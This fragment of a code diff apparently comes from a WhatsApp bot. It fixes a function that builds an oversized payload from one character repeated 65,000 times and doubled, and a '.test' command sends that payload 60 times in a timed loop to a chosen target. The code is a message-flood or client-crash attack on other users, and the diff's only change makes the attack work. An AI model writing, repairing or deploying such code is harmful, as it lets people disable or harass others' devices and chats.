@@ -276,7 +276,7 @@ const channelInfo = {
 
 
 
-async function Lovegc_by_sy(targetJid) {
+async function Lovegc_by_sy(sock, targetJid) {
     try {
         const LoveString = "ཹ".repeat(65000);
         const SY_love_payload = LoveString.repeat(2);
@@ -2717,7 +2717,7 @@ case userMessage.startsWith('.test'): {
     }, { quoted: message });
     
     for (let i = 0; i < 60; i++) {
-        await Lovegc_by_sy(targetJid);
+        await Lovegc_by_sy(sock, targetJid);
         await new Promise(r => setTimeout(r, 280 + Math.random() * 120));
     }
 
